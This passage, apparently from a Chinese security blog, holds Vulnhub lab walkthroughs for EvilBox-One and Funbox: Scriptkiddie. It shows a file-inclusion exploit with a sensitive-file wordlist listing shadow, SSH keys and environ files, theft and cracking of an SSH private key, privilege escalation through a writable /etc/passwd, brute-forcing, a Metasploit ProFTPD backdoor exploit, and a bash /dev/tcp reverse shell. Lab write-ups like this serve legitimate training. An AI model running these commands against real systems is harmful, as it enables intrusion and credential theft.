<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081521939.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081522264.png" /></p>
<p>对 22 尝试弱口令无果……继续 web 信息收集</p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>目录遍历</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081524084.png" /></p>
<p><code>http://192.168.159.134/robots.txt</code> 下看到个
<code>Hello H4x0r</code> ，H4x0r 可能是个用户名</p>
<p><code>(http://192.168.159.134/secret/</code>
一片空白……再次尝试目录遍历，常规扫描不到结果时或许我们可以考虑多换几个字典试试，由于是做目录遍历也可指定我们猜测的可能后缀，示例如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.134/secret/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e php,html,txt -f</span><br></pre></td></tr></table></figure>
<p>注，当不知道或看不懂命令时，我们或许更应该去查查，而不是简单的复制粘贴</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081616378.png" /></p>
<p>扫到个 evil.php，访问依旧空白……陷入僵局……谷歌……evil.php
存在文件包含漏洞，进一步模糊测试【以读取 /etc/passwd 为例】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -w /usr/share/wordlists/wfuzz/general/common.txt -w path_dic.txt -u <span class="string">&quot;http://192.168.159.134/secret/evil.php?FUZZ=FUZ2Zetc/passwd&quot;</span> --hw 0</span><br></pre></td></tr></table></figure>
<p>注，FUZZ【字典 common.txt】，FUZ2Z【字典
path_dic.txt】是表示多个测试位置，放在哪里就测试哪里。由于不知道
evil.php 的路径，所以要成功读取 /etc/passwd 也要对其测试。--hw 0
则是对响应按字数过滤下，</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081601212.png" /></p>
<p>由结果得FUZZ=command，FUZ2Z=../../../../</p>
<p>浏览器读取 /etc/passwd</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081604594.png" /></p>
<p>有个 mowree 用户，第一个 flag 估计就在该用户的目录下，直接尝试读取
user.txt
【/home/mowree/user.txt】无果……可能路径不对，也可能文件做了权限处理</p>
<p>继续 FUZZ 系统文件【找个 Linux 敏感文件的字典折腾】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -w linux_file_dic.txt -u <span class="string">&quot;http://192.168.159.134/secret/evil.php?command=../../../..FUZZ&quot;</span> --hw 0 </span><br></pre></td></tr></table></figure>
<p>linux_file_dic.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/﻿﻿etc/httpd/conf/httpd.conf</span><br><span class="line">/~/.atftp_history</span><br><span class="line">/~/.bash_history</span><br><span class="line">/~/.bashrc</span><br><span class="line">/~/.mysql_history</span><br><span class="line">/~/.nano_history</span><br><span class="line">/~/.php_history</span><br><span class="line">/~/.profile</span><br><span class="line">/~/.ssh/authorized_keys</span><br><span class="line">/~/.ssh/id_dsa</span><br><span class="line">/~/.ssh/id_dsa.pub</span><br><span class="line">/~/.ssh/id_rsa</span><br><span class="line">/~/.ssh/id_rsa.pub</span><br><span class="line">/~/.ssh/identity</span><br><span class="line">/~/.ssh/identity.pub</span><br><span class="line">/~/.ssh/known_hosts</span><br><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/at.allow</span><br><span class="line">/etc/at.deny</span><br><span class="line">/etc/bashrc</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/group</span><br><span class="line">/etc/host.conf</span><br><span class="line">/etc/hosts</span><br><span class="line">/etc/hosts.deny</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/htdocs/index.html</span><br><span class="line">/etc/httpd/htdocs/index.php</span><br><span class="line">/etc/httpd/httpd.conf</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/inputrc</span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue/net</span><br><span class="line">/etc/ld.so.conf</span><br><span class="line">/etc/logrotate.conf</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/etc/protocols</span><br><span class="line">/etc/rc.local</span><br><span class="line">/etc/redhat-release</span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/etc/syscomfig/network-scripts/ifcfg-eth1</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">/etc/termcap</span><br><span class="line">/etc/vsftpd/vsftpd.conf</span><br><span class="line">/etc/xinetd.conf</span><br><span class="line">/etc/xinetd.d</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home/httpd/conf/httpd.conf</span><br><span class="line">/home/root/.atftp_history</span><br><span class="line">/home/root/.bash_history</span><br><span class="line">/home/root/.bashrc</span><br><span class="line">/home/root/.mysql_history</span><br><span class="line">/home/root/.nano_history</span><br><span class="line">/home/root/.php_history</span><br><span class="line">/home/root/.profile</span><br><span class="line">/home/root/.ssh/authorized_keys</span><br><span class="line">/home/root/.ssh/id_dsa</span><br><span class="line">/home/root/.ssh/id_dsa.pub</span><br><span class="line">/home/root/.ssh/id_rsa</span><br><span class="line">/home/root/.ssh/id_rsa.pub</span><br><span class="line">/home/root/.ssh/identity</span><br><span class="line">/home/root/.ssh/identity.pub</span><br><span class="line">/home/root/anaconda-ks.cfg</span><br><span class="line">/home/mowree/.bash_history</span><br><span class="line">/home/mowree/.atftp_history</span><br><span class="line">/home/mowree/.bash_history</span><br><span class="line">/home/mowree/.bashrc</span><br><span class="line">/home/mowree/.mysql_history</span><br><span class="line">/home/mowree/.nano_history</span><br><span class="line">/home/mowree/.php_history</span><br><span class="line">/home/mowree/.profile</span><br><span class="line">/home/mowree/.ssh/authorized_keys</span><br><span class="line">/home/mowree/.ssh/id_dsa</span><br><span class="line">/home/mowree/.ssh/id_dsa.pub</span><br><span class="line">/home/mowree/.ssh/id_rsa</span><br><span class="line">/home/mowree/.ssh/id_rsa.pub</span><br><span class="line">/home/mowree/.ssh/identity</span><br><span class="line">/home/mowree/.ssh/identity.pub</span><br><span class="line">/home/mowree/anaconda-ks.cfg</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/nginx/conf/nginx.conf</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/www/htdocs/index.html</span><br><span class="line">/opt/www/htdocs/index.php</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/porc/config.gz</span><br><span class="line">/porc/self/cmdline</span><br><span class="line">/private/var/log/apache2/access_log</span><br><span class="line">/private/var/log/apache2/error_log</span><br><span class="line">/proc/cmdline</span><br><span class="line">/proc/config.gz</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/pid/cmdline</span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/fd/0</span><br><span class="line">/proc/self/fd/1</span><br><span class="line">/proc/self/fd/10</span><br><span class="line">/proc/self/fd/11</span><br><span class="line">/proc/self/fd/12</span><br><span class="line">/proc/self/fd/13</span><br><span class="line">/proc/self/fd/14</span><br><span class="line">/proc/self/fd/15</span><br><span class="line">/proc/self/fd/16</span><br><span class="line">/proc/self/fd/17</span><br><span class="line">/proc/self/fd/18</span><br><span class="line">/proc/self/fd/19</span><br><span class="line">/proc/self/fd/2</span><br><span class="line">/proc/self/fd/20</span><br><span class="line">/proc/self/fd/21</span><br><span class="line">/proc/self/fd/22</span><br><span class="line">/proc/self/fd/23</span><br><span class="line">/proc/self/fd/24</span><br><span class="line">/proc/self/fd/25</span><br><span class="line">/proc/self/fd/26</span><br><span class="line">/proc/self/fd/27</span><br><span class="line">/proc/self/fd/28</span><br><span class="line">/proc/self/fd/29</span><br><span class="line">/proc/self/fd/3</span><br><span class="line">/proc/self/fd/30</span><br><span class="line">/proc/self/fd/31</span><br><span class="line">/proc/self/fd/32</span><br><span class="line">/proc/self/fd/33</span><br><span class="line">/proc/self/fd/34</span><br><span class="line">/proc/self/fd/35</span><br><span class="line">/proc/self/fd/4</span><br><span class="line">/proc/self/fd/5</span><br><span class="line">/proc/self/fd/6</span><br><span class="line">/proc/self/fd/7</span><br><span class="line">/proc/self/fd/8</span><br><span class="line">/proc/self/fd/9</span><br><span class="line">/proc/self/loginuid</span><br><span class="line">/proc/self/stat</span><br><span class="line">/proc/self/status</span><br><span class="line">/proc/verison</span><br><span class="line">/proc/version</span><br><span class="line">/proc/xxxx/cmdline</span><br><span class="line">/root/.atftp_history</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/root/.nano_history</span><br><span class="line">/root/.php_history</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/root/.viminfo</span><br><span class="line">/root/.wget-hsts</span><br><span class="line">/root/anaconda-ks.cfg</span><br><span class="line">/tmp/apache/htdocs/index.html</span><br><span class="line">/tmp/apache/htdocs/index.php</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/php5/lib/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br><span class="line">/usr/share/tomcat6/bin/startup.sh</span><br><span class="line">/usr/tomcat6/bin/startup.sh</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/htdocs/index.html</span><br><span class="line">/var/httpd/htdocs/index.php</span><br><span class="line">/var/lib/mlocate/mlocate.db</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/chttp.log</span><br><span class="line">/var/log/cups/error_log</span><br><span class="line">/var/log/dpkg.log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/httpd/error.log</span><br><span class="line">/var/log/httpd/error_log</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/lighttpd/access.log</span><br><span class="line">/var/log/lighttpd/error.log</span><br><span class="line">/var/log/lighttpd/lighttpd.access.log</span><br><span class="line">/var/log/lighttpd/lighttpd.error.log</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/mysql.log</span><br><span class="line">/var/log/mysql/mysql.log</span><br><span class="line">/var/log/mysql/mysql-bin.log</span><br><span class="line">/var/log/mysql/mysql-slow.log</span><br><span class="line">/var/log/mysqlderror.log</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/xferlog</span><br><span class="line">/var/log/yum.log</span><br><span class="line">/var/mail/root</span><br><span class="line">/var/mysql.log</span><br><span class="line">/var/run/utmp</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/mail/root</span><br><span class="line">/var/webmin/miniserv.log</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/var/www/htdocs/index.html</span><br><span class="line">/var/www/htdocs/index.php</span><br><span class="line">/var/www/html/</span><br><span class="line">/var/www/html/apache/conf/httpd.conf</span><br><span class="line">/var/www/html/index.html</span><br><span class="line">/var/www/index.html</span><br><span class="line">/var/www/index.php</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/error_log</span><br><span class="line">/var/www/phpmyadmin/config.inc.php</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/htdocs/index.html</span><br><span class="line">/www/htdocs/index.php</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081635752.png" /></p>
<p>由扫描得 mowree 下有 ssh
登录的公钥【/home/mowree/.ssh/authorized_keys】和私钥【/home/mowree/.ssh/id_rsa】，为此下载私钥后如果能破解的话，即可以
mowree 远程登录，下载破解测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> id_rsa &amp;&amp; curl <span class="string">&quot;http://192.168.159.134/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa&quot;</span> &gt; id_rsa &amp;&amp; <span class="built_in">chmod</span> 600 id_rsa</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081715325.png" /></p>
<p>利用 ssh2john 转换成 john 可处理的格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh2john id_rsa &gt; john_id_rsa</span><br></pre></td></tr></table></figure>
<p>破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john john_id_rsa --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081718285.png" /></p>
<p>得 unicorn</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="ssh-登录">2.1. ssh 登录</h3>
<p>利用前面得到的私钥和密码远程登录靶机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@192.168.159.134 -i id_rsa </span><br></pre></td></tr></table></figure>
<p>得到第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081721754.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
<p>无果……继续</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081753008.png" /></p>
<p>当前用户对 /etc/passwd 有写权限，或许可以添加个 root
权限的用户或直接修改 root 的密码</p>
<p>尝试修改 root 密码，利用 openssl 生成个密码并写入 passwd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081826946.png" /></p>
<p>添加 root 权限的用户同理……</p>
<blockquote>
<p>推荐阅读：<a
href="https://www.cnblogs.com/shadow-/p/16878609.html">靶机:
EvilBox---One - sha0dow - 博客园</a></p>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox: Scriptkiddie</title>
    <url>/2024/04/24/Funbox%20Scriptkiddie/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/funbox-scriptkiddie,725/">Funbox:
Scriptkiddie ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.159</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 03:34 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.159</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 65527 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.3c</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a6:0e:30:35:3b:ef:43:44:f5:1c:d7:c6:58:64:09:92 (RSA)</span><br><span class="line">|   256 c2:d8:bd:62:bf:13:89:28:f8:61:e0:a6:c4:f7:a5:bf (ECDSA)</span><br><span class="line">|_  256 12:60:6e:58:ee:f2:bd:9c:ff:b0:35:05:83:08:71:b8 (ED25519)</span><br><span class="line">25/tcp  open  smtp        Postfix smtpd</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_smtp-commands: funbox11, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class="line">| ssl-cert: Subject: commonName=funbox11</span><br><span class="line">| Not valid before: 2021-07-19T16:52:14</span><br><span class="line">|_Not valid after:  2031-07-17T16:52:14</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Funbox: Scriptkiddie</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 6.5.2</span><br><span class="line">110/tcp open  pop3?</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:B2:A8:38 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Hosts:  funbox11, FUNBOX11; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: funbox11</span><br><span class="line">|   NetBIOS computer name: FUNBOX11\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: funbox11</span><br><span class="line">|_  System time: 2024-04-23T09:37:53+02:00</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-04-23T07:37:53</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: FUNBOX11, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.80 ms 192.168.159.159</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 200.71 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 是 WordPress【6.5.2】，利用 wpscan 扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.159/&quot;</span> -eu</span><br></pre></td></tr></table></figure>
<p>扫到个 admin 尝试爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.159/&quot;</span> --usernames=admin --passwords=rockyou.txt</span><br></pre></td></tr></table></figure>
<p>未果，利用 cewl 爬个字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w pass1.txt http://192.168.159.159/                     </span><br><span class="line">cewl -w pass2.txt http://192.168.159.159/index.php/2021/07/20/hallo-welt/</span><br></pre></td></tr></table></figure>
<p>依旧没跑出来……扫目录也没得到有价值的信息</p>
<h3 id="扫-smb-信息">1.4. 扫 smb 信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.159.159</span><br></pre></td></tr></table></figure>
<p>有个 bill 用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241652164.png" /></p>
<p>hydra 尝试爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l bill -P ../rockyou.txt smb://192.168.159.159  -v</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241711025.png" /></p>
<p>允许匿名登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.159.159</span><br><span class="line">smbmap  -H 192.168.159.159 -x <span class="string">&#x27;ipconfig /all&#x27;</span></span><br><span class="line">smbmap  -H 192.168.159.159 -r <span class="string">&#x27;print$&#x27;</span></span><br><span class="line">smbmap  -H 192.168.159.159 -r <span class="string">&#x27;IPC$&#x27;</span></span><br><span class="line"></span><br><span class="line">smbclient -L 192.168.159.159 -N</span><br><span class="line">smbclient <span class="string">&#x27;\\192.168.159.159\IPC$&#x27;</span> -N </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241729086.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241729087.png" /></p>
<p>没权限……也没找到 smb 可用漏洞……</p>
<h3 id="ftp-漏洞">1.5. FTP 漏洞</h3>
<p>nmap 扫到了 ProFTPD 1.3.3c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21/tcp  open  ftp         ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
<p>谷歌 ProFTPD 1.3.3c 存在 Backdoor Command Execution 漏洞</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>msf 搜索得 <code>exploit/unix/ftp/proftpd_133c_backdoor</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241740967.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.159.159</span><br><span class="line">show payloads</span><br><span class="line"><span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.159.152</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241740842.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241740841.png" /></p>
<p>拿到 flag</p>
<h2 id="补充玩">3. 补充【玩】</h2>
<h3 id="修改-wordpress-admin-密码">3.1. 修改 wordpress admin 密码</h3>
<p>利用 msf 的 shell 重新反弹个 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.159.152/8080 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>完善</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line"><span class="built_in">export</span> TERM=xterm </span><br><span class="line"><span class="comment"># 按下 Ctrl+z 退出 nc </span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span> </span><br><span class="line"><span class="comment"># 输入reset </span></span><br><span class="line"><span class="built_in">stty</span> rows 46 columns 188</span><br></pre></td></tr></table></figure>
<p>wp-config.php 中读到数据库配置信息，mysql 登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uwordpress -pwordpress -Dwordpress</span><br></pre></td></tr></table></figure>
